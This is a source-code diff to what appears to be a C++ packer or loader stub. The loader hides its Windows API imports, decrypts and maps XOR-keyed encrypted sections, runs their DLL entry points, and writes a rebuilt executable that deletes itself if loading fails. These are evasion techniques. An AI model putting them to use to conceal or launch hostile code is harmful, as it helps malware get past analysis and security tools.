@@ -19,13 +19,14 @@ NTSYSAPI ULONG RtlRandomEx(PULONG Seed);
 #define ERR_FAILED_TO_FIND_LOADER_SECTION 2
 #define ERR_FAILED_TO_FIND_BOOTSTRAP_SECTION 3
 #define ERR_FAILED_TO_OPEN_FILE_FOR_NEW_EXECUTABLE 4
-#define ERR_FAILED_TO_WRITE_NEW_EXECUTABLE_TO_DISK 5
-#define ERR_FAILED_TO_WRITE_ENTIRE_NEW_EXECUTABLE_TO_DISK 6
-#define ERR_FAILED_TO_MAP_ENCRYPTED_SECTION 7
-#define ERR_FAILED_TO_RELOCATE_IMAGE 8
-#define ERR_FAILED_TO_FIND_IMPORTED_MODULE 9
-#define ERR_FAILED_TO_FIND_IMPORTED_FUNCTION 10
-#define ERR_FAILED_TO_EXECUTE_DLL_ENTRY_POINT 11
+#define ERR_FAILED_TO_SET_DELETE_FILE_INFO 5
+#define ERR_FAILED_TO_WRITE_NEW_EXECUTABLE_TO_DISK 6
+#define ERR_FAILED_TO_WRITE_ENTIRE_NEW_EXECUTABLE_TO_DISK 7
+#define ERR_FAILED_TO_MAP_ENCRYPTED_SECTION 8
+#define ERR_FAILED_TO_RELOCATE_IMAGE 9
+#define ERR_FAILED_TO_FIND_IMPORTED_MODULE 10
+#define ERR_FAILED_TO_FIND_IMPORTED_FUNCTION 11
+#define ERR_FAILED_TO_EXECUTE_DLL_ENTRY_POINT 12
 
 // simple memcpy that can be inlined
 __forceinline void inline_memcpy(PVOID dest, PVOID src, SIZE_T size) {
@@ -120,7 +121,7 @@ __forceinline int map_encrypted_image(ULONG_PTR base, PIMAGE_SECTION_HEADER data
     auto dll_entry_point = (DllMain)(new_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
     auto success = dll_entry_point((HINSTANCE)new_image_base, DLL_PROCESS_ATTACH, nullptr);
     if (!success)
-        EXIT_WITH_ERROR(ERR_FAILED_TO_EXECUTE_DLL_ENTRY_POINT, "Failed to execute dll entry point");
+        return ERR_FAILED_TO_EXECUTE_DLL_ENTRY_POINT;
     
     return ERR_SUCCESS;
 }
@@ -146,8 +147,12 @@ __forceinline int map_encrypted_sections(ULONG_PTR base) {
         if (section->Name[0] != 'e')
             continue;
 
-        if (map_encrypted_image(base, section) != ERR_SUCCESS)
-            EXIT_WITH_ERROR(ERR_FAILED_TO_MAP_ENCRYPTED_SECTION, "Failed to map encrypted section");
+        auto error = map_encrypted_image(base, section);
+        if (error != ERR_SUCCESS) {
+            if (error != ERR_FAILED_TO_EXECUTE_DLL_ENTRY_POINT)
+                EXIT_WITH_ERROR(ERR_FAILED_TO_MAP_ENCRYPTED_SECTION, "Failed to map encrypted section");
+            return error;
+        }
     }
     
     return ERR_SUCCESS;
@@ -160,6 +165,7 @@ extern "C" void initial_loader(ULONG_PTR xorKey) {
     auto fnGetTickCount64 = LI_FN(GetTickCount64).get();
     auto fnRtlRandomEx = LI_FN(RtlRandomEx).get();
     auto fnCreateFileA = LI_FN(CreateFileA).get();
+    auto fnSetFileInformationByHandle = LI_FN(SetFileInformationByHandle).get();
     auto fnWriteFile = LI_FN(WriteFile).get();
     auto fnCloseHandle = LI_FN(CloseHandle).get();
     auto fnExitProcess = LI_FN(ExitProcess).get();
@@ -287,20 +293,43 @@ extern "C" void initial_loader(ULONG_PTR xorKey) {
     file_name[19] = 'e';
     file_name[20] = '\0';
 
-    auto file_handle = fnCreateFileA(file_name, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    auto file_handle = fnCreateFileA(file_name, GENERIC_WRITE | DELETE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
     if (file_handle == INVALID_HANDLE_VALUE)
         EXIT_WITH_ERROR(ERR_FAILED_TO_OPEN_FILE_FOR_NEW_EXECUTABLE, "Failed to open file for new executable");
+    
+    FILE_DISPOSITION_INFO disposition_info;
+    disposition_info.DeleteFile = TRUE;
+    if (!fnSetFileInformationByHandle(file_handle, FileDispositionInfo, &disposition_info, sizeof(disposition_info))) {
+        fnCloseHandle(file_handle);
+        EXIT_WITH_ERROR(ERR_FAILED_TO_SET_DELETE_FILE_INFO, "Failed to set delete file info (1)");
+    }
 
     DWORD bytes_written = 0;
-    if (!fnWriteFile(file_handle, (PVOID)new_image_base, FileSize, &bytes_written, nullptr))
+    if (!fnWriteFile(file_handle, (PVOID)new_image_base, FileSize, &bytes_written, nullptr)) {
+        fnCloseHandle(file_handle);
         EXIT_WITH_ERROR(ERR_FAILED_TO_WRITE_NEW_EXECUTABLE_TO_DISK, "Failed to write new executable to disk");
+    }
 
-    fnCloseHandle(file_handle);
-
-    if (bytes_written != FileSize)
+    if (bytes_written != FileSize) {
+        fnCloseHandle(file_handle);
         EXIT_WITH_ERROR(ERR_FAILED_TO_WRITE_ENTIRE_NEW_EXECUTABLE_TO_DISK, "Failed to write entire new executable to disk");
+    }
 
     fnVirtualFree((PVOID)new_image_base, 0, MEM_RELEASE);
 
-    fnExitProcess(map_encrypted_sections(base));
+    auto error = map_encrypted_sections(base);
+    if (error != ERR_SUCCESS) {
+        fnCloseHandle(file_handle);
+        fnExitProcess(error);
+        return;
+    }
+
+    disposition_info.DeleteFileW = FALSE;
+    if (!fnSetFileInformationByHandle(file_handle, FileDispositionInfo, &disposition_info, sizeof(disposition_info))) {
+        fnCloseHandle(file_handle);
+        EXIT_WITH_ERROR(ERR_FAILED_TO_SET_DELETE_FILE_INFO, "Failed to set delete file info (2)");
+    }
+
+    fnCloseHandle(file_handle);
+    fnExitProcess(0);
 }
